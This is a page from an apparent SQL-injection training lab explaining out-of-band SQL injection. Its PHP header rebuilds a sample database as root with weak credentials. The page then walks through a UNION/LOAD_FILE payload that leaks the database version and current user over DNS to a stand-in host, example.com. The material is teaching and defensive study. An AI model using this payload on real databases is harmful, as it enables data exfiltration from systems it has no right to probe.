<?php

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

$server = 'localhost';
$username = 'root';
$password = '';

$connOne = new mysqli($server, $username, $password);

$sql = "DROP USER IF EXISTS 'sandbox_user'@'localhost';";
$connOne->query($sql);

$sql = "DROP DATABASE IF EXISTS sample_db;";
$connOne->query($sql);

$connOne = new mysqli($server, $username, $password);

$sql = "CREATE DATABASE IF NOT EXISTS sample_db;";
$connOne->query($sql);

$db = 'sample_db';

$conn = new mysqli($server, $username, $password, $db);

$sql = "USE sample_db;";
$conn->query($sql);

$sql = "CREATE TABLE IF NOT EXISTS products (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(20), country VARCHAR(20));";
$conn->query($sql);

$sql = "INSERT INTO products (name, country) VALUES ('Apples', 'Spain'), ('Bananas', 'South Africa'), ('Cheese', 'France'), ('Dragonfruit', 'Indonesia');";
$conn->query($sql);

$sql = "CREATE TABLE IF NOT EXISTS comments (id INT AUTO_INCREMENT PRIMARY KEY, message VARCHAR(50))";
$conn->query($sql);

$sql = "INSERT INTO comments (message) VALUES ('Hello!'), ('HI'), ('Heyyyy'), ('Evening')";

$sql = "CREATE TABLE IF NOT EXISTS users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(20) UNIQUE, password VARCHAR(20));";
$conn->query($sql);

$sql = "INSERT INTO users (username, password) VALUES ('administrator', 'password');";
$conn->query($sql);

$sql = "CREATE USER IF NOT EXISTS 'sandbox_user'@'localhost' IDENTIFIED BY 'password';";
$conn->query($sql);

$sql = "GRANT SELECT, INSERT, UPDATE, DELETE ON sample_db.* TO 'sandbox_user'@'localhost';";
$conn->query($sql);

$sql = "FLUSH PRIVILEGES;";
$conn->query($sql);

$conn->close();

?>

<!DOCTYPE html>

<html>

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" href="css/style.css">

</head>

<body>

    <div class="vertical-menu">

        <a href="index.php">Home</a>

        <a href="sqli_home.php" >SQL Injection</a>

        <a href="sqli_in_band.php" >In-Band SQLI</a>

        <a href="sqli_blind.php" >Blind SQLI</a>

        <a href="sqli_oob.php">OOB SQLI</a>

        <a href="sqli_prevention.php">SQLI Prevention</a>

        <a href="xss_home.php">XSS</a>

    </div>

    <div class="main">

        <div class="description" style="border-radius: 10px 10px 0px 0px; padding-bottom: 0px;">

            <div class="sub_description" style="background-image: url('images/in_band.png');">

                <h2 style="margin-top: 0px;">Out Of Band SQLi</h2>

                <p><b>Description: </b>Out-of-band SQL Injections sends the response from the database to an attacker's remote endpoint. Out-of-band SQL injection becomes feasible only when the database server being utilised supports commands that initiate DNS or HTTP requests. However, this condition holds true for most widely used SQL servers.</p>

            </div>

        </div>

        <div class="description" style="border-radius: 0px 0px 10px 10px; padding-top: 0px;">

            <div class="sub_description" style="background-image: url('images/in_band.png');">

            <p style="margin-top: 0px;"><b>Example: </b>In our scenario, an attacker uses out-of-band SQL injection through DNS on a search function.</p>

                <ol>
                    
                    <li>This is the query for the search function used:</li>
                    <br>
                    <span class="code_space">bSELECT name FROM product WHERE name = '$name';</span>
                    <br>
                    <br>
                    <li>Then the attacker proceeds to use this payload:</li>
                    <br>
                    <span class="code_space">' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT CURRENT_USER),'.example.com\\test.txt'));</span>
                    <br>
                    
                    <br>
                    <li>Let's break down how the command works:</li>
                    <br>
                    <ul>
                        <li>In combination with the union command, the attacker first closes of the query with a single quotation and uses the union operator to combine and perform the out-of-band injection.</li>
                        <br>
                        <span class="code_space"><span style="color: red;">' UNION</span> SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT CURRENT_USER),'.example.com\\test.txt'));</span>
                        <br>
                        <br>
                        <li style="line-height: 30px;">The <span class="code_space" style="padding: 5px 5px 5px 5px;">CONCAT</span> command in SQL combines words or results of commands, separated by commas into a single sentence (Sidenote: To represent a single backslash within the query, it needs to have two backslashes):</li>
                        <br>
                        <span class="code_space">' UNION SELECT LOAD_FILE(<span style="color: red;">CONCAT('\\\\',(SELECT+@@version),'.',(SELECT CURRENT_USER),'.example.com\\test.txt')</span>);</span>
                        <br>
                        <br>
                        <li>So, it will look like this when concatenated:</li>
                        <br>
                        <span class="code_space">' UNION SELECT LOAD_FILE(<span style="color: red;">\\SELECT+@@version.SELECT CURRENT_USER.example.com\test.txt'</span>);</span>
                        <br>
                        <br>
                        <li style="line-height: 30px;">The <span class="code_space" style="padding: 5px 5px 5px 5px;">LOAD_FILE</span> file function is used to read files from a directory, this directory is retrieved from the <span class="code_space" style="padding: 5px 5px 5px 5px;">secure_file_priv</span> variable within the database.  The <span class="code_space" style="padding: 5px 5px 5px 5px;">LOAD_FILE</span> function can only read files specified from the <span class="code_space" style="padding: 5px 5px 5px 5px;">secure_file_priv</span> variable, in our scenario, the <span class="code_space" style="padding: 5px 5px 5px 5px;">secure_file_priv</span> variable is left empty.</li>
                        <br>
                        <span class="code_space">' UNION SELECT <span style="color: red;">LOAD_FILE(\\SELECT+@@version.SELECT CURRENT_USER.example.com\test.txt')</span>;</span>
                        <br>
                        <br>
                        <br>
                        <li>The <span class="code_space">LOAD_FILE</span> command will then actively search for the location specified within the <span class="code_space">LOAD_FILE</span> function.</li>
                        <br>
                        <span class="code_space">\\SELECT+@@version.SELECT CURRENT_USER.example.com\test.txt'</span>
                        <br>
                        <br>

                        <li>This will trigger a request to the attacker's server that is hosting the website "example.com", along with the results of the SQL commands within the same link. And thus the attacker will see:</li>
                        <br>
                        <span class="code_space">\10.4.32-MariaDB.root@localhost.example.com\test.txt</span>

                    </ul>

                </ol>
                
            </div>

        </div>

    </div>

</body>

</html>




